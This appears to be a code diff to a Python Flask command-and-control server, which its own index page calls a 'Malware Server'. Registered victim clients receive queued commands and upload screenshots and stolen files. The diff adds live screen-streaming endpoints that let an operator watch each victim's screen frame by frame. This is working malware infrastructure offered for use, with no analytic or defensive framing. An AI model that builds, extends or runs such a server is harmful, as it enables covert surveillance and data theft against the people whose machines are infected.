@@ -26,6 +26,9 @@ if not os.path.exists(UPLOAD_FOLDER):
 
 app.config['UPLOAD_FOLDER'] = UPLOAD_FOLDER
 
+# Streaming state
+streaming_clients = {}  # {client_id: {"active": True, "last_frame": None, "frame_time": 0}}
+
 # --- Helpers ---
 
 def clean_clients():
@@ -55,7 +58,8 @@ def register():
         "ip": ip,
         "last_seen": time.time(),
         "command_queue": [],
-        "results": {}
+        "results": {},
+        "streaming": False
     }
     
     print(f"[+] Client registered: {client_id} from {ip}")
@@ -104,18 +108,28 @@ def upload_file():
     """Client uploads a file (screenshot or downloaded file)"""
     client_id = request.form.get('id')
     cmd_id = request.form.get('cmd_id')
+    is_stream_frame = request.form.get('is_stream_frame', 'false') == 'true'
     
     if not client_id or client_id not in clients:
         return jsonify({"error": "Unknown client"}), 404
-        
+    
     if 'file' not in request.files:
         return jsonify({"error": "No file part"}), 400
-        
+    
     file = request.files['file']
     if file.filename == '':
         return jsonify({"error": "No selected file"}), 400
-        
-    # Save file
+    
+    # For streaming frames, store directly in memory
+    if is_stream_frame:
+        file_data = file.read()
+        if client_id not in streaming_clients:
+            streaming_clients[client_id] = {}
+        streaming_clients[client_id]['last_frame'] = file_data
+        streaming_clients[client_id]['frame_time'] = time.time()
+        return jsonify({"status": "frame_received"})
+    
+    # Save file for regular uploads
     filename = secure_filename(f"{client_id}_{int(time.time())}_{file.filename}")
     filepath = os.path.join(app.config['UPLOAD_FOLDER'], filename)
     file.save(filepath)
@@ -159,6 +173,16 @@ def admin_command():
         "params": cmd_params
     }
     
+    # Handle streaming commands
+    if cmd_type == 'start_stream':
+        clients[target_id]['streaming'] = True
+        if target_id not in streaming_clients:
+            streaming_clients[target_id] = {}
+    elif cmd_type == 'stop_stream':
+        clients[target_id]['streaming'] = False
+        if target_id in streaming_clients:
+            del streaming_clients[target_id]
+    
     clients[target_id]['command_queue'].append(command)
     return jsonify({"cmd_id": cmd_id, "status": "queued"})
 
@@ -179,9 +203,27 @@ def admin_download(filename):
     """Admin downloads a file uploaded by client"""
     return send_file(os.path.join(app.config['UPLOAD_FOLDER'], secure_filename(filename)))
 
+@app.route('/admin/stream_frame/<client_id>', methods=['GET'])
+def admin_stream_frame(client_id):
+    """Admin gets latest stream frame from client"""
+    if client_id in streaming_clients:
+        frame_data = streaming_clients[client_id].get('last_frame')
+        if frame_data:
+            from flask import Response
+            return Response(frame_data, mimetype='image/jpeg')
+    return jsonify({"error": "No frame available"}), 404
+
+@app.route('/admin/stream_status/<client_id>', methods=['GET'])
+def admin_stream_status(client_id):
+    """Check if client is streaming"""
+    if client_id in clients:
+        return jsonify({"streaming": clients[client_id].get('streaming', False)})
+    return jsonify({"streaming": False})
+
 @app.route('/')
 def index():
     return "Malware Server Running. Use Admin Client."
 
 if __name__ == '__main__':
-    app.run(host='0.0.0.0', port=5000)
+    port = int(os.environ.get('PORT', 5000))
+    app.run(host='0.0.0.0', port=port)
